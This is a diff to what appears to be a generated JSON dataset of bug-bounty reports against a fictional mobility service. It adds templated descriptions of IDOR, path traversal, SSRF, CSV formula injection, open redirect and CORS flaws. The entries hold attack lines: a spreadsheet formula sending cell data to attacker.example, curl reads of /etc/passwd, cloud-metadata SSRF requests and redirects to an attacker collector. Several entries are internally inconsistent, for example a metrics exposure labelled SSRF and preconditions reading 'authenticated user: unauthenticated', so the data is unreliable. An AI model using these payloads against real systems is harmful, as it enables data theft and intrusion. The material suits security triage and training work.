+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schneeconnect-mobility.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7849,7 +7909,8 @@
           "offset": "1d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7957,7 +8018,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schneeconnect-mobility.foo/export`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8105,7 +8167,8 @@
           "offset": "4d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.schneeconnect-mobility.foo/export`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8256,7 +8319,8 @@
           "offset": "5d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.schneeconnect-mobility.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8379,7 +8443,8 @@
           "offset": "1d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8502,7 +8567,8 @@
           "offset": "4d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.schneeconnect-mobility.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8657,7 +8723,8 @@
           "offset": "9d 18h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8770,7 +8837,8 @@
           "offset": "2d 5h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.schneeconnect-mobility.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8865,7 +8933,8 @@
           "offset": "5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schneeconnect-mobility.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8976,7 +9045,8 @@
           "offset": "2d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9093,7 +9163,8 @@
           "offset": "6d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9220,7 +9291,8 @@
           "offset": "2d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9315,7 +9387,8 @@
           "offset": "1d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9447,7 +9520,8 @@
           "offset": "6d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9566,7 +9640,8 @@
           "offset": "5d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.schneeconnect-mobility.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9697,7 +9772,8 @@
           "offset": "7d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9824,7 +9900,8 @@
           "offset": "6d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.schneeconnect-mobility.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9933,7 +10010,8 @@
           "offset": "5d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10076,7 +10154,8 @@
           "offset": "2d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schneeconnect-mobility.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10235,7 +10314,8 @@
           "offset": "2d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10367,7 +10447,8 @@
           "offset": "8d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://pay.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10518,7 +10599,8 @@
           "offset": "7d 8h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://pay.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10614,7 +10696,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10760,7 +10843,8 @@
           "offset": "5d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://pay.schneeconnect-mobility.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10884,7 +10968,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://pay.schneeconnect-mobility.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11011,7 +11096,8 @@
           "offset": "4d 11h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://pay.schneeconnect-mobility.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11179,7 +11265,8 @@
           "offset": "5d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://pay.schneeconnect-mobility.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11319,7 +11406,8 @@
           "offset": "1d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://pay.schneeconnect-mobility.foo/import`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11466,7 +11554,8 @@
           "offset": "7d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://app.schneeconnect-mobility.foo/api/import`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11610,7 +11699,8 @@
           "offset": "8d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://pay.schneeconnect-mobility.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11712,7 +11802,8 @@
           "offset": "2d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
